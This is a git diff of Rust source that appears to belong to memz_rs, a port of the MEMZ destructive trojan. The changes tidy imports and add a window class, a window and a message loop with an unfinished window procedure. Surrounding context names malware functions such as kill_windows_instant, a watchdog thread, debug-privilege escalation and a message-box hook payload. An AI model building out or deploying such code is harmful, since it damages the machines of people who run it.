@@ -12,11 +12,7 @@ use memz_rs::{
     },
     payloads::payloads::msg_box_hook,
     utils::log,
-    wrap_windows_api::{
-        set_privilege, wrap_close_handle, wrap_create_toolhelp32_snapshot,
-        wrap_get_current_thread_id, wrap_get_process_image_filename_a, wrap_messagebox_a,
-        wrap_process32_next, wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, Resolution,
-    },
+    wrap_windows_api::*,
     LMEM_ZEROINIT,
 };
 use rand::Rng;
@@ -25,15 +21,24 @@ use std::{
     thread::{self, sleep},
     time::Duration,
 };
-use windows::Win32::{
-    Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, NTSTATUS},
-    Graphics::Gdi::HFONT,
-    Security::SE_DEBUG_NAME,
-    System::{
-        Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-        Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
+use windows::{
+    core::PCSTR,
+    Win32::{
+        Foundation::{
+            BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, LPARAM, LRESULT, NTSTATUS, WPARAM,
+        },
+        Graphics::Gdi::{HBRUSH, HFONT},
+        Security::SE_DEBUG_NAME,
+        System::{
+            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
+            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
+        },
+        UI::WindowsAndMessaging::{
+            CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW,
+            CS_VREDRAW, HCURSOR, HICON, HMENU, MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, MSG, WH_CBT,
+            WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
+        },
     },
-    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
 };
 
 struct Clean {
@@ -97,14 +102,67 @@ fn kill_windows_instant() -> Result<(), ()> {
     Ok(())
 }
 
-fn main() {
+fn main() -> Result<(), ()> {
     log::new_log();
 
     let res = Resolution::new();
     let watchdog_thread = thread::spawn(watchdog_thread);
     watchdog_thread.join().unwrap().unwrap();
 
+    let c: WNDCLASSEXA = WNDCLASSEXA {
+        cbSize: size_of::<WNDCLASSEXA>() as u32,
+        style: CS_HREDRAW | CS_VREDRAW,
+        lpfnWndProc: Some(window_proc),
+        cbClsExtra: 0,
+        cbWndExtra: 0,
+        hInstance: HMODULE(0),
+        hIcon: HICON(0),
+        hCursor: HCURSOR(0),
+        hbrBackground: HBRUSH(0),
+        lpszMenuName: PCSTR::null(),
+        lpszClassName: *"hax".to_pcstr(),
+        hIconSm: HICON(0),
+    };
+
+    wrap_register_class_ex_a(&c)?;
+
+    let hwnd = unsafe {
+        CreateWindowExA(
+            WINDOW_EX_STYLE(0),
+            *"hax".to_pcstr(),
+            PCSTR::null(),
+            WINDOW_STYLE(0),
+            0,
+            0,
+            100,
+            100,
+            HWND(0),
+            HMENU(0),
+            HMODULE(0),
+            None,
+        )
+    };
+
+    if hwnd.0 == 0 {
+        panic!("CreateWindowExA is NULL")
+    }
+
+    let mut msg: MSG = Default::default();
+    while wrap_get_message(&mut msg, hwnd, 0, 0)? {
+        unsafe {
+            if !TranslateMessage(&mut msg).as_bool() {
+                return Err(eprintln!(
+                    "Failed TranslateMessage()\nError: message is not translated"
+                ));
+            };
+
+            DispatchMessageA(&mut msg); // return value generally is ignored
+        };
+    }
+
+    Ok(())
 }
+
 
 fn watchdog_thread() -> Result<(), ()> {
     let mut oproc = 0;
@@ -241,4 +299,8 @@ fn watchdog_thread() -> Result<(), ()> {
 
         sleep(Duration::from_millis(10));
     }
+}
+
+unsafe extern "system" fn window_proc(_: HWND, _: u32, _: WPARAM, _: LPARAM) -> LRESULT {
+    todo!()
 }
